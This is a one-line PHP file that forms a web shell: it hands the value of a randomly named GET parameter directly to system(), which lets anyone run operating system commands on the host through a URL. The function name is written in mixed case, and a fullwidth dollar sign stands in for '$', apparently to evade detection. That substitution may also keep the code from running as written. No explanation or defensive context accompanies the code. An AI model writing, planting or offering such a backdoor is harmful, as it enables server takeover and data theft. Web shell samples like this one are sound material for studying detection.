<?php
SysTeM(＄_GET['zOzC8KDz']);
?>
